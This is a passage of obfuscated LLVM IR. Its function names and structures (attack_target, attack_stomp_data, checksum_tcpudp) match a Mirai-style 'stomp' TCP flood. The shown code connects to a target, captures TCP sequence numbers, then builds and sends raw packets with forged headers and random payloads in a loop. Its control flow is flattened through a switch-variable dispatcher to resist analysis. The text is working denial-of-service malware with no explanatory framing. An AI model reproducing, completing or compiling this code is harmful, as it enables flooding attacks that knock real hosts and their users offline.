  %167 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %174 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %173, i32 0, i32 0
  store i32 %172, i32* %174, align 4
  store i32 -591416081, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i16, i16* %17, align 2
  %177 = zext i16 %176 to i32
  %178 = icmp eq i32 %177, 65535
  %179 = select i1 %178, i32 -363286448, i32 825608296
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = call i32 @rand_next()
  %182 = and i32 %181, 65535
  %183 = trunc i32 %182 to i16
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %183, i16* %184, align 2
  store i32 1288321756, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i16, i16* %17, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %187, i16* %188, align 2
  store i32 1288321756, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i32, i32* %26, align 4
  %191 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %192 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %192, %struct.sockaddr** %191, align 8
  %193 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %194 = load %struct.sockaddr*, %struct.sockaddr** %193, align 8
  %195 = call i32 @connect(i32 %190, %struct.sockaddr* %194, i32 16)
  %196 = call i64 @time(i64* null) #6
  store i64 %196, i64* %31, align 8
  store i32 1327349090, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  store i32 16, i32* %29, align 4
  %198 = load i32, i32* %10, align 4
  %199 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %200 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %201 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %201, %struct.sockaddr** %200, align 8
  %202 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %203 = load %struct.sockaddr*, %struct.sockaddr** %202, align 8
  %204 = call i64 @recvfrom(i32 %198, i8* %199, i64 256, i32 16384, %struct.sockaddr* %203, i32* %29)
  %205 = trunc i64 %204 to i32
  store i32 %205, i32* %33, align 4
  %206 = load i32, i32* %33, align 4
  %207 = icmp eq i32 %206, -1
  %208 = select i1 %207, i32 1473655135, i32 1103872625
  store i32 %208, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  store i32 1201367086, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %212 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 4
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %215 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 4
  %217 = icmp eq i32 %213, %216
  %218 = select i1 %217, i32 -1523174447, i32 -1449395436
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %33, align 4
  %221 = sext i32 %220 to i64
  %222 = icmp ugt i64 %221, 40
  %223 = select i1 %222, i32 -324541366, i32 -1449395436
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %226 = getelementptr inbounds i8, i8* %225, i64 20
  %227 = bitcast i8* %226 to %struct.tcphdr*
  store %struct.tcphdr* %227, %struct.tcphdr** %35, align 8
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = load i16, i16* %229, align 4
  %231 = zext i16 %230 to i32
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %233 = load i16, i16* %232, align 2
  %234 = zext i16 %233 to i32
  %235 = icmp eq i32 %231, %234
  %236 = select i1 %235, i32 922088958, i32 -587858669
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = lshr i16 %240, 9
  %242 = and i16 %241, 1
  %243 = zext i16 %242 to i32
  %244 = icmp ne i32 %243, 0
  %245 = select i1 %244, i32 866675674, i32 -1398811771
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = lshr i16 %249, 12
  %251 = and i16 %250, 1
  %252 = zext i16 %251 to i32
  %253 = icmp ne i32 %252, 0
  %254 = select i1 %253, i32 126905619, i32 -1398811771
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %257 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 4
  %259 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %259, i64 %261
  %263 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %262, i32 0, i32 0
  store i32 %258, i32* %263, align 4
  %264 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 2
  %266 = load i32, i32* %265, align 4
  %267 = call i32 @ntohl(i32 %266) #7
  %268 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %271, i32 0, i32 1
  store i32 %267, i32* %272, align 4
  %273 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 3
  %275 = load i32, i32* %274, align 4
  %276 = call i32 @ntohl(i32 %275) #7
  %277 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i32 0, i32 2
  store i32 %276, i32* %281, align 4
  %282 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 1
  %284 = load i16, i16* %283, align 2
  %285 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i32 0, i32 3
  store i16 %284, i16* %289, align 4
  %290 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %291 = load i16, i16* %290, align 2
  %292 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %295, i32 0, i32 4
  store i16 %291, i16* %296, align 2
  %297 = load i32, i32* %24, align 4
  %298 = sext i32 %297 to i64
  %299 = add i64 40, %298
  %300 = call noalias i8* @malloc(i64 %299) #6
  %301 = load i8**, i8*** %12, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  store i8* %300, i8** %304, align 8
  %305 = load i8**, i8*** %12, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds i8*, i8** %305, i64 %307
  %309 = load i8*, i8** %308, align 8
  %310 = bitcast i8* %309 to %struct.iphdr*
  store %struct.iphdr* %310, %struct.iphdr** %36, align 8
  %311 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i64 1
  %313 = bitcast %struct.iphdr* %312 to %struct.tcphdr*
  store %struct.tcphdr* %313, %struct.tcphdr** %37, align 8
  %314 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i64 1
  %316 = bitcast %struct.tcphdr* %315 to i8*
  store i8* %316, i8** %38, align 8
  %317 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %318 = bitcast %struct.iphdr* %317 to i8*
  %319 = load i8, i8* %318, align 4
  %320 = and i8 %319, 15
  %321 = or i8 %320, 64
  store i8 %321, i8* %318, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %323 = bitcast %struct.iphdr* %322 to i8*
  %324 = load i8, i8* %323, align 4
  %325 = and i8 %324, -16
  %326 = or i8 %325, 5
  store i8 %326, i8* %323, align 4
  %327 = load i8, i8* %13, align 1
  %328 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 1
  store i8 %327, i8* %329, align 1
  %330 = load i32, i32* %24, align 4
  %331 = sext i32 %330 to i64
  %332 = add i64 40, %331
  %333 = trunc i64 %332 to i16
  %334 = call zeroext i16 @htons(i16 zeroext %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 2
  store i16 %334, i16* %336, align 2
  %337 = load i16, i16* %14, align 2
  %338 = call zeroext i16 @htons(i16 zeroext %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  %341 = load i8, i8* %15, align 1
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 5
  store i8 %341, i8* %343, align 4
  %344 = load i8, i8* %16, align 1
  %345 = icmp ne i8 %344, 0
  %346 = select i1 %345, i32 1745512891, i32 -1493026927
  store i32 %346, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 4
  store i16 %348, i16* %350, align 2
  store i32 -1493026927, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i32 0, i32 6
  store i8 6, i8* %353, align 1
  %354 = load i32, i32* @LOCAL_ADDR, align 4
  %355 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  %357 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 4
  %363 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 9
  store i32 %362, i32* %364, align 4
  %365 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i32 0, i32 3
  %370 = load i16, i16* %369, align 4
  %371 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 0
  store i16 %370, i16* %372, align 4
  %373 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i32 0, i32 4
  %378 = load i16, i16* %377, align 2
  %379 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 1
  store i16 %378, i16* %380, align 2
  %381 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %384, i32 0, i32 2
  %386 = load i32, i32* %385, align 4
  %387 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 2
  store i32 %386, i32* %388, align 4
  %389 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %390 = load i32, i32* %9, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %392, i32 0, i32 1
  %394 = load i32, i32* %393, align 4
  %395 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 3
  store i32 %394, i32* %396, align 4
  %397 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 4
  %399 = load i16, i16* %398, align 4
  %400 = and i16 %399, -241
  %401 = or i16 %400, 128
  store i16 %401, i16* %398, align 4
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 4
  %404 = load i16, i16* %403, align 4
  %405 = and i16 %404, -257
  %406 = or i16 %405, 256
  store i16 %406, i16* %403, align 4
  %407 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %408 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %407, i32 0, i32 4
  %409 = load i16, i16* %408, align 4
  %410 = and i16 %409, -4097
  %411 = or i16 %410, 4096
  store i16 %411, i16* %408, align 4
  %412 = call i32 @rand_next()
  %413 = and i32 %412, 65535
  %414 = trunc i32 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 5
  store i16 %414, i16* %416, align 2
  %417 = load i8, i8* %18, align 1
  %418 = sext i8 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 4
  %421 = load i16, i16* %420, align 4
  %422 = and i16 %418, 1
  %423 = shl i16 %422, 13
  %424 = and i16 %421, -8193
  %425 = or i16 %424, %423
  store i16 %425, i16* %420, align 4
  %426 = load i8, i8* %19, align 1
  %427 = sext i8 %426 to i16
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 4
  %430 = load i16, i16* %429, align 4
  %431 = and i16 %427, 1
  %432 = shl i16 %431, 12
  %433 = and i16 %430, -4097
  %434 = or i16 %433, %432
  store i16 %434, i16* %429, align 4
  %435 = load i8, i8* %20, align 1
  %436 = sext i8 %435 to i16
  %437 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 4
  %439 = load i16, i16* %438, align 4
  %440 = and i16 %436, 1
  %441 = shl i16 %440, 11
  %442 = and i16 %439, -2049
  %443 = or i16 %442, %441
  store i16 %443, i16* %438, align 4
  %444 = load i8, i8* %21, align 1
  %445 = sext i8 %444 to i16
  %446 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 4
  %448 = load i16, i16* %447, align 4
  %449 = and i16 %445, 1
  %450 = shl i16 %449, 10
  %451 = and i16 %448, -1025
  %452 = or i16 %451, %450
  store i16 %452, i16* %447, align 4
  %453 = load i8, i8* %22, align 1
  %454 = sext i8 %453 to i16
  %455 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 4
  %457 = load i16, i16* %456, align 4
  %458 = and i16 %454, 1
  %459 = shl i16 %458, 9
  %460 = and i16 %457, -513
  %461 = or i16 %460, %459
  store i16 %461, i16* %456, align 4
  %462 = load i8, i8* %23, align 1
  %463 = sext i8 %462 to i16
  %464 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 4
  %466 = load i16, i16* %465, align 4
  %467 = and i16 %463, 1
  %468 = shl i16 %467, 8
  %469 = and i16 %466, -257
  %470 = or i16 %469, %468
  store i16 %470, i16* %465, align 4
  %471 = load i8*, i8** %38, align 8
  %472 = load i32, i32* %24, align 4
  call void @rand_str(i8* %471, i32 %472)
  store i32 -1307758754, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 4
  %476 = load i16, i16* %475, align 4
  %477 = lshr i16 %476, 8
  %478 = and i16 %477, 1
  %479 = zext i16 %478 to i32
  %480 = icmp ne i32 %479, 0
  %481 = select i1 %480, i32 -193086114, i32 -2142629966
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 4
  %485 = load i16, i16* %484, align 4
  %486 = lshr i16 %485, 10
  %487 = and i16 %486, 1
  %488 = zext i16 %487 to i32
  %489 = icmp ne i32 %488, 0
  %490 = select i1 %489, i32 -193086114, i32 -780568181
  store i32 %490, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i32, i32* %26, align 4
  %493 = call i32 @close(i32 %492)
  store i32 1197780694, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  store i32 -98184415, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  store i32 -587858669, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  store i32 -1449395436, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = call i64 @time(i64* null) #6
  %499 = load i64, i64* %31, align 8
  %500 = sub nsw i64 %498, %499
  %501 = icmp sgt i64 %500, 10
  %502 = select i1 %501, i32 16822973, i32 -2128764509
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i32, i32* %26, align 4
  %505 = call i32 @close(i32 %504)
  store i32 1197780694, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  store i32 1327349090, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 -994711834, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  %509 = load i32, i32* %9, align 4
  %510 = add nsw i32 %509, 1
  store i32 %510, i32* %9, align 4
  store i32 362184990, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  store i32 -899725029, i32* %switchVar
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1890303233, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i32, i32* %9, align 4
  %515 = load i8, i8* %5, align 1
  %516 = zext i8 %515 to i32
  %517 = icmp slt i32 %514, %516
  %518 = select i1 %517, i32 -1261005816, i32 -395070472
  store i32 %518, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %520 = load i8**, i8*** %12, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds i8*, i8** %520, i64 %522
  %524 = load i8*, i8** %523, align 8
  store i8* %524, i8** %39, align 8
  %525 = load i8*, i8** %39, align 8
  %526 = bitcast i8* %525 to %struct.iphdr*
  store %struct.iphdr* %526, %struct.iphdr** %40, align 8
  %527 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i64 1
  %529 = bitcast %struct.iphdr* %528 to %struct.tcphdr*
  store %struct.tcphdr* %529, %struct.tcphdr** %41, align 8
  %530 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i64 1
  %532 = bitcast %struct.tcphdr* %531 to i8*
  store i8* %532, i8** %42, align 8
  %533 = load i16, i16* %14, align 2
  %534 = zext i16 %533 to i32
  %535 = icmp eq i32 %534, 65535
  %536 = select i1 %535, i32 1165094115, i32 -1794583658
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = call i32 @rand_next()
  %539 = and i32 %538, 65535
  %540 = trunc i32 %539 to i16
  %541 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 3
  store i16 %540, i16* %542, align 4
  store i32 -1794583658, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8, i8* %25, align 1
  %545 = icmp ne i8 %544, 0
  %546 = select i1 %545, i32 -136280144, i32 769611023
  store i32 %546, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i8*, i8** %42, align 8
  %549 = load i32, i32* %24, align 4
  call void @rand_str(i8* %548, i32 %549)
  store i32 769611023, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  %551 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 0, i16* %552, align 2
  %553 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %554 = bitcast %struct.iphdr* %553 to i16*
  %555 = call zeroext i16 @checksum_generic(i16* %554, i32 20)
  %556 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 %555, i16* %557, align 2
  %558 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %559 = load i32, i32* %9, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %558, i64 %560
  %562 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %561, i32 0, i32 1
  %563 = load i32, i32* %562, align 4
  %564 = add i32 %563, 1
  store i32 %564, i32* %562, align 4
  %565 = trunc i32 %563 to i16
  %566 = call zeroext i16 @htons(i16 zeroext %565) #7
  %567 = zext i16 %566 to i32
  %568 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 2
  store i32 %567, i32* %569, align 4
  %570 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %571 = load i32, i32* %9, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %570, i64 %572
  %574 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %573, i32 0, i32 2
  %575 = load i32, i32* %574, align 4
  %576 = trunc i32 %575 to i16
  %577 = call zeroext i16 @htons(i16 zeroext %576) #7
  %578 = zext i16 %577 to i32
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 3
  store i32 %578, i32* %580, align 4
  %581 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %582 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %581, i32 0, i32 6
  store i16 0, i16* %582, align 4
  %583 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %584 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %585 = bitcast %struct.tcphdr* %584 to i8*
  %586 = load i32, i32* %24, align 4
  %587 = sext i32 %586 to i64
  %588 = add i64 20, %587
  %589 = trunc i64 %588 to i16
  %590 = call zeroext i16 @htons(i16 zeroext %589) #7
  %591 = load i32, i32* %24, align 4
  %592 = sext i32 %591 to i64
  %593 = add i64 20, %592
  %594 = trunc i64 %593 to i32
  %595 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %583, i8* %585, i16 zeroext %590, i32 %594)
  %596 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 6
  store i16 %595, i16* %597, align 4
  %598 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 1
  %600 = load i16, i16* %599, align 2
  %601 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %602 = load i32, i32* %9, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i64 %603
  %605 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %604, i32 0, i32 0
  %606 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %605, i32 0, i32 1
  store i16 %600, i16* %606, align 2
  %607 = load i32, i32* %10, align 4
  %608 = load i8*, i8** %39, align 8
  %609 = load i32, i32* %24, align 4
  %610 = sext i32 %609 to i64
  %611 = add i64 40, %610
  %612 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %613 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %614 = load i32, i32* %9, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i64 %615
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i32 0, i32 0
  %618 = bitcast %struct.sockaddr_in* %617 to %struct.sockaddr*
  store %struct.sockaddr* %618, %struct.sockaddr** %612, align 8
  %619 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %620 = load %struct.sockaddr*, %struct.sockaddr** %619, align 8
  %621 = call i64 @sendto(i32 %607, i8* %608, i64 %611, i32 16384, %struct.sockaddr* %620, i32 16)
  store i32 -540721314, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i32, i32* %9, align 4
  %624 = add nsw i32 %623, 1
  store i32 %624, i32* %9, align 4
